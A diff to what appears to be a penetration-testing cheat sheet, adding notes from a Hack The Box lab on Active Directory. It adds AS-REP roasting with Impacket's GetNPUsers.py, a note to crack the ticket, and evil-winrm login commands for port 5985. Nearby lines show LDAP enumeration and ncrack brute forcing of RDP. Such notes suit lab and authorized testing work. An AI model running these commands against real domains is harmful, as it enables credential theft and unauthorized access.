@@ -188,6 +188,13 @@ ldapsearch -h 10.129.136.235 -p 389 -x -b "dc=htb,dc=local"
 
 ➤ Enumerate all objects in the domain
 ./windapsearch.py -d test.com --dc-ip 10.0.0.1 --custom "objectClass=*" 
+CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
+The service alfresco needs Kerberos pre-authentication to be disabled. This means that we can request the encrypted TGT for this user. 
+
+➤ Request a TGT ticket
+./GetNPUsers.py DOMAIN/USERNAME -dc-ip <IP> -no-pass
+
+Crack the obtained TGT ticket then used is again port 5985 using evil-winrm
 ```
 
 #### With user account
@@ -245,4 +252,11 @@ ncrack -vv --user administrator -P passwords.txt rdp://10.0.0.1,CL=1
 rdesktop 10.0.0.1
 rdesktop -u <username> <IP>
 rdesktop -d <domain> -u <username> -p <password> <IP>
+```
+
+
+
+## Port 5985
+```
+ruby evil-winrm.rb -i <IP> -u <USERNAME> -p <PASSWORD>
 ```
